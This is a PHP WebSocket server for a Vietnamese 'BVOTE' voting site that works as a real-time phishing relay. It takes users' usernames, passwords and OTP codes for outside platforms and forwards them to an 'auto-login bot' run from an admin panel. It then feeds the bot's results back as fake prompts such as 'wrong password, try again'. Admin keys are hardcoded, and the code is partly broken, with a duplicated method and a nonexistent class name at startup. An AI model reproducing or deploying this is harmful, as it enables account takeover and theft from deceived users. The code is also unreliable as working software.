<?php
/**
 * BVOTE 2025 - Enhanced WebSocket Server for Real-time Admin ↔ User Communication
 * Chức năng: Hệ thống kết nối điều khiển 2 chiều realtime
 *
 * 🔒 INTERFACE LOCKED - Chỉ phát triển backend logic
 * 🔁 Real-time monitoring, control, và response system
 */

require_once 'vendor/autoload.php'; // Composer autoload for ReactPHP
require_once 'database.php';

use React\Socket\SocketServer;
use React\Http\HttpServer;
use React\Http\Message\Response;
use React\Stream\WritableResourceStream;

class BVoteRealtimeControlServer {
    private $clients = [];
    private $adminClients = [];
    private $userClients = [];
    private $pendingLogins = [];
    private $userSessions = [];
    private $adminCommands = [];

    public function __construct() {
        $this->startServer();
    }

    public function startServer() {
        $loop = React\EventLoop\Factory::create();

        // WebSocket Server for real-time communication
        $socket = new SocketServer('127.0.0.1:8080', $loop);

        $socket->on('connection', function($connection) {
            $this->handleConnection($connection);
        });

        echo "🚀 BVOTE Real-time Control Server started on ws://127.0.0.1:8080\n";
        echo "📱 User Interface Monitoring: Active\n";
        echo "⚙️  Admin Control Dashboard: Active\n";
        echo "🔁 2-Way Communication: Ready\n";
        echo "📊 Real-time Logging: Enabled\n\n";

        // Start periodic cleanup and monitoring
        $loop->addPeriodicTimer(30, function() {
            $this->cleanupExpiredSessions();
            $this->broadcastSystemStats();
        });

        $loop->run();
    }

    private function handleConnection($connection) {
        $clientId = uniqid('client_');
        $this->clients[$clientId] = [
            'connection' => $connection,
            'connected_at' => time(),
            'ip_address' => $connection->getRemoteAddress(),
            'last_activity' => time(),
            'type' => 'unknown'
        ];

        echo "🔗 New connection: $clientId from {$connection->getRemoteAddress()}\n";

        $connection->on('data', function($data) use ($clientId, $connection) {
            $this->handleMessage($clientId, $data, $connection);
        });

        $connection->on('close', function() use ($clientId) {
            $this->handleDisconnection($clientId);
        });

        // Send welcome message
        $this->sendMessage($connection, [
            'type' => 'welcome',
            'client_id' => $clientId,
            'server_time' => date('Y-m-d H:i:s'),
            'message' => 'Connected to BVOTE Real-time Control Server'
        ]);
    }

    private function handleMessage($clientId, $data, $connection) {
        try {
            $message = json_decode($data, true);

            if (!$message || !isset($message['type'])) {
                return;
            }

            // Update client activity
            if (isset($this->clients[$clientId])) {
                $this->clients[$clientId]['last_activity'] = time();
            }

            switch ($message['type']) {
                case 'register_user':
                    $this->registerUser($clientId, $message, $connection);
                    break;

                case 'register_admin':
                    $this->registerAdmin($clientId, $message, $connection);
                    break;

                case 'user_action':
                    $this->handleUserAction($clientId, $message, $connection);
                    break;

                case 'admin_command':
                    $this->handleAdminCommand($clientId, $message);
                    break;

                case 'login_request':
                    $this->handleLoginRequest($clientId, $message, $connection);
                    break;

                case 'login_result':
                    $this->handleLoginResult($clientId, $message);
                    break;

                case 'otp_request':
                    $this->handleOTPRequest($clientId, $message);
                    break;

                case 'otp_response':
                    $this->handleOTPResponse($clientId, $message);
                    break;

                case 'vote_action':
                    $this->handleVoteAction($clientId, $message);
                    break;

                case 'heartbeat':
                    $this->handleHeartbeat($clientId, $connection);
                    break;

                default:
                    echo "❓ Unknown message type: {$message['type']} from $clientId\n";
            }

            // Log all activities to database
            $this->logActivity($clientId, $message);

        } catch (Exception $e) {
            echo "❌ Error handling message from $clientId: " . $e->getMessage() . "\n";
            $this->sendMessage($connection, [
                'type' => 'error',
                'message' => 'Server error occurred'
            ]);
        }
    }

    /**
     * Register User Client với thông tin chi tiết
     */
    private function registerUser($clientId, $message, $connection) {
        $userInfo = [
            'client_id' => $clientId,
            'connection' => $connection,
            'user_id' => $message['user_id'] ?? null,
            'email' => $message['email'] ?? null,
            'session_token' => $message['session_token'] ?? null,
            'ip_address' => $connection->getRemoteAddress(),
            'user_agent' => $message['user_agent'] ?? 'Unknown',
            'registered_at' => time(),
            'status' => 'active'
        ];

        $this->userClients[$clientId] = $userInfo;
        $this->clients[$clientId]['type'] = 'user';

        // Create user session tracking
        $sessionId = uniqid('session_');
        $this->userSessions[$sessionId] = [
            'client_id' => $clientId,
            'user_info' => $userInfo,
            'actions' => [],
            'started_at' => time()
        ];

        $this->sendMessage($connection, [
            'type' => 'user_registered',
            'client_id' => $clientId,
            'session_id' => $sessionId,
            'status' => 'Đã kết nối thành công',
            'server_time' => date('Y-m-d H:i:s')
        ]);

        // Notify all admins about new user
        $this->notifyAdminsNewUser($userInfo, $sessionId);

        echo "👤 User registered: $clientId ({$userInfo['email']})\n";

        // Save to database
        $this->saveUserSession($userInfo, $sessionId);
    }

    /**
     * Register Admin Client với xác thực quyền
     */
    private function registerAdmin($clientId, $message, $connection) {
        // Verify admin credentials
        $adminKey = $message['admin_key'] ?? '';
        if (!$this->verifyAdminKey($adminKey)) {
            $this->sendMessage($connection, [
                'type' => 'admin_auth_failed',
                'message' => 'Unauthorized access'
            ]);
            $connection->close();
            return;
        }

        $adminInfo = [
            'client_id' => $clientId,
            'connection' => $connection,
            'admin_id' => $message['admin_id'] ?? null,
            'admin_name' => $message['admin_name'] ?? 'Unknown Admin',
            'permissions' => $message['permissions'] ?? ['view'],
            'ip_address' => $connection->getRemoteAddress(),
            'registered_at' => time()
        ];

        $this->adminClients[$clientId] = $adminInfo;
        $this->clients[$clientId]['type'] = 'admin';

        $this->sendMessage($connection, [
            'type' => 'admin_registered',
            'client_id' => $clientId,
            'status' => 'Admin dashboard connected',
            'active_users' => count($this->userClients),
            'server_time' => date('Y-m-d H:i:s')
        ]);

        // Send current system status to new admin
        $this->sendSystemStatusToAdmin($connection);

        echo "⚙️  Admin registered: $clientId ({$adminInfo['admin_name']})\n";
    }

    /**
     * Xử lý hành động từ User (form submission, voting, etc.)
     */
    private function handleUserAction($clientId, $message, $connection) {
        $actionData = [
            'client_id' => $clientId,
            'action_type' => $message['action_type'],
            'action_data' => $message['data'] ?? [],
            'timestamp' => time(),
            'ip_address' => $connection->getRemoteAddress()
        ];

        // Add to user session
        if (isset($this->userClients[$clientId])) {
            $sessionId = $this->findSessionByClientId($clientId);
            if ($sessionId && isset($this->userSessions[$sessionId])) {
                $this->userSessions[$sessionId]['actions'][] = $actionData;
            }
        }

        // Notify admins in real-time
        $this->broadcastToAdmins([
            'type' => 'user_action_detected',
            'client_id' => $clientId,
            'user_email' => $this->userClients[$clientId]['email'] ?? 'Unknown',
            'action' => $actionData,
            'timestamp' => date('Y-m-d H:i:s')
        ]);

        // Send acknowledgment to user
        $this->sendMessage($connection, [
            'type' => 'action_acknowledged',
            'action_id' => uniqid('action_'),
            'status' => 'Đang xử lý...'
        ]);

        echo "🎯 User action: {$message['action_type']} from $clientId\n";
    }

    /**
     * Xử lý lệnh từ Admin
     */
    private function handleAdminCommand($clientId, $message) {
        if (!isset($this->adminClients[$clientId])) {
            return; // Not authorized
        }

        $command = $message['command'];
        $targetClientId = $message['target_client_id'] ?? null;
        $commandData = $message['data'] ?? [];

        switch ($command) {
            case 'approve_otp':
                $this->approveOTP($targetClientId, $commandData);
                break;

            case 'reject_login':
                $this->rejectLogin($targetClientId, $commandData);
                break;

            case 'send_notification':
                $this->sendUserNotification($targetClientId, $commandData);
                break;

            case 'terminate_session':
                $this->terminateUserSession($targetClientId, $commandData);
                break;

            case 'request_reverification':
                $this->requestReverification($targetClientId, $commandData);
                break;

            case 'get_user_details':
                $this->sendUserDetailsToAdmin($clientId, $targetClientId);
                break;

            case 'broadcast_message':
                $this->broadcastToUsers($commandData);
                break;

            default:
                echo "❓ Unknown admin command: $command\n";
        }

        // Log admin command
        $this->logAdminCommand($clientId, $command, $targetClientId, $commandData);

        echo "⚙️  Admin command: $command from $clientId\n";
    }

    /**
     * Admin approve OTP
     */
    private function approveOTP($targetClientId, $data) {
        if (!isset($this->userClients[$targetClientId])) {
            return;
        }

        $connection = $this->userClients[$targetClientId]['connection'];

        $this->sendMessage($connection, [
            'type' => 'otp_approved',
            'message' => 'Xác minh thành công!',
            'redirect_url' => $data['redirect_url'] ?? null
        ]);

        // Update session status
        $sessionId = $this->findSessionByClientId($targetClientId);
        if ($sessionId) {
            $this->userSessions[$sessionId]['actions'][] = [
                'type' => 'otp_approved_by_admin',
                'timestamp' => time(),
                'admin_note' => $data['note'] ?? ''
            ];
        }
    }

    /**
     * Admin reject login
     */
    private function rejectLogin($targetClientId, $data) {
        if (!isset($this->userClients[$targetClientId])) {
            return;
        }

        $connection = $this->userClients[$targetClientId]['connection'];

        $this->sendMessage($connection, [
            'type' => 'login_rejected',
            'message' => $data['reason'] ?? 'Đăng nhập bị từ chối',
            'can_retry' => $data['can_retry'] ?? false
        ]);
    }

    /**
     * Send notification to specific user
     */
    private function sendUserNotification($targetClientId, $data) {
        if (!isset($this->userClients[$targetClientId])) {
            return;
        }

        $connection = $this->userClients[$targetClientId]['connection'];

        $this->sendMessage($connection, [
            'type' => 'admin_notification',
            'title' => $data['title'] ?? 'Thông báo',
            'message' => $data['message'] ?? '',
            'priority' => $data['priority'] ?? 'normal',
            'timestamp' => date('Y-m-d H:i:s')
        ]);
    }

    /**
     * Terminate user session
     */
    private function terminateUserSession($targetClientId, $data) {
        if (!isset($this->userClients[$targetClientId])) {
            return;
        }

        $connection = $this->userClients[$targetClientId]['connection'];

        $this->sendMessage($connection, [
            'type' => 'session_terminated',
            'reason' => $data['reason'] ?? 'Phiên đã bị ngắt bởi quản trị viên',
            'can_reconnect' => $data['can_reconnect'] ?? true
        ]);

        // Close connection after 2 seconds
        $loop = React\EventLoop\Loop::get();
        $loop->addTimer(2, function() use ($connection) {
            $connection->close();
        });
    }

    /**
     * Request user reverification
     */
    private function requestReverification($targetClientId, $data) {
        if (!isset($this->userClients[$targetClientId])) {
            return;
        }

        $connection = $this->userClients[$targetClientId]['connection'];

        $this->sendMessage($connection, [
            'type' => 'reverification_required',
            'method' => $data['method'] ?? 'otp', // otp, email, device
            'message' => 'Vui lòng xác minh lại để tiếp tục',
            'timeout' => $data['timeout'] ?? 300 // 5 minutes
        ]);
    }

    /**
     * Xử lý voting action
     */
    private function handleVoteAction($clientId, $message) {
        $voteData = [
            'client_id' => $clientId,
            'campaign_id' => $message['campaign_id'],
            'contestant_id' => $message['contestant_id'],
            'timestamp' => time()
        ];

        // Notify admins immediately
        $this->broadcastToAdmins([
            'type' => 'vote_cast',
            'user_email' => $this->userClients[$clientId]['email'] ?? 'Unknown',
            'vote_data' => $voteData,
            'timestamp' => date('Y-m-d H:i:s')
        ]);

        // Save vote to database
        $this->saveVoteToDatabase($voteData);

        echo "🗳️  Vote cast: Campaign {$message['campaign_id']}, Contestant {$message['contestant_id']} from $clientId\n";
    }

    /**
     * Handle heartbeat to keep connection alive
     */
    private function handleHeartbeat($clientId, $connection) {
        $this->sendMessage($connection, [
            'type' => 'heartbeat_response',
            'timestamp' => time()
        ]);
    }

    /**
     * Handle login request from user
     */
    private function handleLoginRequest($clientId, $message, $connection) {
        $loginId = uniqid('login_');

        $loginData = [
            'login_id' => $loginId,
            'user_client_id' => $clientId,
            'platform' => $message['platform'],
            'username' => $message['username'],
            'password' => $message['password'],
            'otp' => $message['otp'] ?? null,
            'timestamp' => time(),
            'status' => 'pending'
        ];

        $this->pendingLogins[$loginId] = $loginData;

        // Gửi request đến Admin Bot System
        $this->broadcastToAdmins([
            'type' => 'auto_login_request',
            'login_id' => $loginId,
            'platform' => $message['platform'],
            'username' => $message['username'],
            'password' => $message['password'],
            'otp' => $message['otp'] ?? null,
            'user_agent' => $message['user_agent'] ?? 'Chrome/91.0',
            'proxy' => $message['proxy'] ?? null
        ]);

        // Phản hồi cho User
        $this->sendMessage($connection, [
            'type' => 'login_processing',
            'login_id' => $loginId,
            'status' => 'Đang chờ xác minh...',
            'message' => 'Hệ thống đang xử lý đăng nhập'
        ]);

        echo "🔐 Login request from $clientId: {$message['platform']} / {$message['username']}\n";
    }

    private function handleLoginResult($clientId, $message) {
        $loginId = $message['login_id'];

        if (!isset($this->pendingLogins[$loginId])) {
            return;
        }

        $loginData = $this->pendingLogins[$loginId];
        $userClientId = $loginData['user_client_id'];

        if (!isset($this->userClients[$userClientId])) {
            return;
        }

        $userConnection = $this->userClients[$userClientId];

        if ($message['success']) {
            // Đăng nhập thành công
            $this->sendMessage($userConnection, [
                'type' => 'login_success',
                'login_id' => $loginId,
                'platform' => $loginData['platform'],
                'username' => $loginData['username'],
                'session_data' => $message['session_data'] ?? [],
                'message' => 'Đăng nhập thành công!'
            ]);

            // Lưu session vào database
            $this->saveUserSession($loginData, $message['session_data'] ?? []);

            echo "✅ Login successful for: {$loginData['username']}\n";
        } else {
            // Xử lý các trường hợp lỗi
            $errorType = $message['error_type'] ?? 'unknown';

            switch ($errorType) {
                case 'invalid_credentials':
                    $responseMessage = 'Sai mật khẩu. Vui lòng thử lại.';
                    break;
                case 'account_not_found':
                    $responseMessage = 'Tài khoản không tồn tại. Thử nền tảng khác.';
                    break;
                case 'requires_otp':
                    $this->sendMessage($userConnection, [
                        'type' => 'otp_required',
                        'login_id' => $loginId,
                        'message' => 'Vui lòng nhập mã OTP từ email/SMS'
                    ]);
                    return;
                case 'device_verification':
                    $responseMessage = 'Yêu cầu xác minh thiết bị. Vui lòng kiểm tra email.';
                    break;
                default:
                    $responseMessage = 'Đăng nhập thất bại. Vui lòng thử lại.';
            }

            $this->sendMessage($userConnection, [
                'type' => 'login_failed',
                'login_id' => $loginId,
                'error_type' => $errorType,
                'message' => $responseMessage
            ]);

            echo "❌ Login failed for: {$loginData['username']} - $errorType\n";
        }

        // Cleanup
        unset($this->pendingLogins[$loginId]);
    }

    private function handleOTPRequest($clientId, $message) {
        $loginId = $message['login_id'];

        if (!isset($this->pendingLogins[$loginId])) {
            return;
        }

        // Chuyển tiếp OTP request đến Admin Bot
        $this->broadcastToAdmins([
            'type' => 'otp_submit',
            'login_id' => $loginId,
            'otp_code' => $message['otp_code']
        ]);

        echo "🔢 OTP submitted for login: $loginId\n";
    }

    private function handleOTPResponse($clientId, $message) {
        $loginId = $message['login_id'];

        if (!isset($this->pendingLogins[$loginId])) {
            return;
        }

        $loginData = $this->pendingLogins[$loginId];
        $userClientId = $loginData['user_client_id'];

        if (!isset($this->userClients[$userClientId])) {
            return;
        }

        $userConnection = $this->userClients[$userClientId];

        if ($message['success']) {
            $this->handleLoginResult($clientId, [
                'login_id' => $loginId,
                'success' => true,
                'session_data' => $message['session_data'] ?? []
            ]);
        } else {
            $this->sendMessage($userConnection, [
                'type' => 'otp_failed',
                'login_id' => $loginId,
                'message' => 'Mã OTP không chính xác. Vui lòng thử lại.'
            ]);
        }
    }

    private function saveUserSession($loginData, $sessionData) {
        try {
            global $pdo;

            $stmt = $pdo->prepare("
                INSERT INTO user_sessions (
                    platform, username, session_data,
                    login_time, ip_address, status
                ) VALUES (?, ?, ?, NOW(), ?, 'active')
            ");

            $stmt->execute([
                $loginData['platform'],
                $loginData['username'],
                json_encode($sessionData),
                $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1'
            ]);

        } catch (Exception $e) {
            echo "❌ Error saving session: " . $e->getMessage() . "\n";
        }
    }

    private function broadcastToAdmins($message) {
        foreach ($this->adminClients as $clientId => $connection) {
            $this->sendMessage($connection, $message);
        }
    }

    private function broadcastToUsers($message) {
        foreach ($this->userClients as $clientId => $connection) {
            $this->sendMessage($connection, $message);
        }
    }

    private function sendMessage($connection, $message) {
        try {
            $connection->write(json_encode($message));
        } catch (Exception $e) {
            echo "❌ Error sending message: " . $e->getMessage() . "\n";
        }
    }

    private function handleDisconnection($clientId) {
        unset($this->clients[$clientId]);
        unset($this->userClients[$clientId]);
        unset($this->adminClients[$clientId]);

        echo "❌ Client disconnected: $clientId\n";
    }

    /**
     * Handle login request với enhanced logging
     */
    private function handleLoginRequest($clientId, $message, $connection) {
        $loginId = uniqid('login_');

        $loginData = [
            'login_id' => $loginId,
            'user_client_id' => $clientId,
            'platform' => $message['platform'],
            'username' => $message['username'],
            'password' => $message['password'],
            'otp' => $message['otp'] ?? null,
            'timestamp' => time(),
            'status' => 'pending',
            'ip_address' => $connection->getRemoteAddress(),
            'user_agent' => $message['user_agent'] ?? 'Unknown'
        ];

        $this->pendingLogins[$loginId] = $loginData;

        // Notify admins about login attempt
        $this->broadcastToAdmins([
            'type' => 'login_attempt_detected',
            'login_id' => $loginId,
            'platform' => $message['platform'],
            'username' => $message['username'],
            'ip_address' => $connection->getRemoteAddress(),
            'timestamp' => date('Y-m-d H:i:s'),
            'requires_approval' => true
        ]);

        // Send to Auto-Login Bot System
        $this->broadcastToAdmins([
            'type' => 'auto_login_request',
            'login_id' => $loginId,
            'platform' => $message['platform'],
            'username' => $message['username'],
            'password' => $message['password'],
            'otp' => $message['otp'] ?? null,
            'user_agent' => $message['user_agent'] ?? 'Chrome/91.0',
            'proxy' => $message['proxy'] ?? null
        ]);

        // Response to user
        $this->sendMessage($connection, [
            'type' => 'login_processing',
            'login_id' => $loginId,
            'status' => 'Đang chờ xác minh...',
            'message' => 'Hệ thống đang xử lý đăng nhập'
        ]);

        echo "🔐 Login request from $clientId: {$message['platform']} / {$message['username']}\n";

        // Log to database
        $this->logLoginAttempt($loginData);
    }

    /**
     * Utility Methods for System Management
     */
    private function verifyAdminKey($key) {
        // In production, verify against database or config
        $validKeys = [
            'admin_master_key_2025',
            'bvote_admin_control',
            // Add more secure keys
        ];
        return in_array($key, $validKeys);
    }

    private function findSessionByClientId($clientId) {
        foreach ($this->userSessions as $sessionId => $session) {
            if ($session['client_id'] === $clientId) {
                return $sessionId;
            }
        }
        return null;
    }

    private function notifyAdminsNewUser($userInfo, $sessionId) {
        $this->broadcastToAdmins([
            'type' => 'new_user_connected',
            'session_id' => $sessionId,
            'user_info' => [
                'email' => $userInfo['email'],
                'ip_address' => $userInfo['ip_address'],
                'user_agent' => $userInfo['user_agent'],
                'connected_at' => date('Y-m-d H:i:s', $userInfo['registered_at'])
            ]
        ]);
    }

    private function sendSystemStatusToAdmin($connection) {
        $status = [
            'type' => 'system_status',
            'stats' => [
                'active_users' => count($this->userClients),
                'active_sessions' => count($this->userSessions),
                'pending_logins' => count($this->pendingLogins),
                'total_connections' => count($this->clients),
                'server_uptime' => time() - ($_SERVER['REQUEST_TIME'] ?? time()),
                'memory_usage' => memory_get_usage(true)
            ],
            'active_users' => array_map(function($user) {
                return [
                    'client_id' => $user['client_id'],
                    'email' => $user['email'] ?? 'Unknown',
                    'ip_address' => $user['ip_address'],
                    'connected_at' => date('Y-m-d H:i:s', $user['registered_at']),
                    'status' => $user['status']
                ];
            }, $this->userClients)
        ];

        $this->sendMessage($connection, $status);
    }

    private function sendUserDetailsToAdmin($adminClientId, $targetClientId) {
        if (!isset($this->adminClients[$adminClientId]) || !isset($this->userClients[$targetClientId])) {
            return;
        }

        $userInfo = $this->userClients[$targetClientId];
        $sessionId = $this->findSessionByClientId($targetClientId);
        $sessionData = $sessionId ? $this->userSessions[$sessionId] : null;

        $details = [
            'type' => 'user_details',
            'target_client_id' => $targetClientId,
            'user_info' => $userInfo,
            'session_data' => $sessionData,
            'recent_activities' => $sessionData ? array_slice($sessionData['actions'], -10) : []
        ];

        $this->sendMessage($this->adminClients[$adminClientId]['connection'], $details);
    }

    private function cleanupExpiredSessions() {
        $currentTime = time();
        $expireTime = 3600; // 1 hour

        foreach ($this->userSessions as $sessionId => $session) {
            if (($currentTime - $session['started_at']) > $expireTime) {
                unset($this->userSessions[$sessionId]);
                echo "🧹 Cleaned expired session: $sessionId\n";
            }
        }

        foreach ($this->clients as $clientId => $client) {
            if (($currentTime - $client['last_activity']) > $expireTime) {
                if (isset($client['connection'])) {
                    $client['connection']->close();
                }
            }
        }
    }

    private function broadcastSystemStats() {
        $stats = [
            'type' => 'system_stats_update',
            'timestamp' => date('Y-m-d H:i:s'),
            'stats' => [
                'active_users' => count($this->userClients),
                'active_admins' => count($this->adminClients),
                'active_sessions' => count($this->userSessions),
                'pending_logins' => count($this->pendingLogins),
                'memory_usage' => memory_get_usage(true)
            ]
        ];

        $this->broadcastToAdmins($stats);
    }

    /**
     * Database Logging Methods
     */
    private function logActivity($clientId, $message) {
        try {
            global $pdo;

            $stmt = $pdo->prepare("
                INSERT INTO realtime_activities (
                    client_id, client_type, activity_type, activity_data,
                    ip_address, timestamp
                ) VALUES (?, ?, ?, ?, ?, NOW())
            ");

            $clientType = $this->clients[$clientId]['type'] ?? 'unknown';
            $ipAddress = $this->clients[$clientId]['ip_address'] ?? 'unknown';

            $stmt->execute([
                $clientId,
                $clientType,
                $message['type'],
                json_encode($message),
                $ipAddress
            ]);

        } catch (Exception $e) {
            error_log("Failed to log activity: " . $e->getMessage());
        }
    }

    private function logAdminCommand($adminClientId, $command, $targetClientId, $data) {
        try {
            global $pdo;

            $stmt = $pdo->prepare("
                INSERT INTO admin_commands_log (
                    admin_client_id, command_type, target_client_id,
                    command_data, executed_at
                ) VALUES (?, ?, ?, ?, NOW())
            ");

            $stmt->execute([
                $adminClientId,
                $command,
                $targetClientId,
                json_encode($data)
            ]);

        } catch (Exception $e) {
            error_log("Failed to log admin command: " . $e->getMessage());
        }
    }

    private function logLoginAttempt($loginData) {
        try {
            global $pdo;

            $stmt = $pdo->prepare("
                INSERT INTO login_attempts (
                    client_id, platform, username, ip_address,
                    user_agent, attempt_time, status
                ) VALUES (?, ?, ?, ?, ?, NOW(), 'pending')
            ");

            $stmt->execute([
                $loginData['user_client_id'],
                $loginData['platform'],
                $loginData['username'],
                $loginData['ip_address'],
                $loginData['user_agent']
            ]);

        } catch (Exception $e) {
            error_log("Failed to log login attempt: " . $e->getMessage());
        }
    }

    private function saveVoteToDatabase($voteData) {
        try {
            global $pdo;

            $stmt = $pdo->prepare("
                INSERT INTO votes (
                    client_id, campaign_id, contestant_id,
                    vote_time, ip_address
                ) VALUES (?, ?, ?, NOW(), ?)
            ");

            $stmt->execute([
                $voteData['client_id'],
                $voteData['campaign_id'],
                $voteData['contestant_id'],
                $voteData['ip_address']
            ]);

        } catch (Exception $e) {
            error_log("Failed to save vote: " . $e->getMessage());
        }
    }
}

// Khởi chạy WebSocket Server
if (basename($_SERVER['PHP_SELF']) === 'websocket_server.php') {
    echo "🚀 Starting BVOTE WebSocket Server...\n";
    new BVoteWebSocketServer();
}
?>
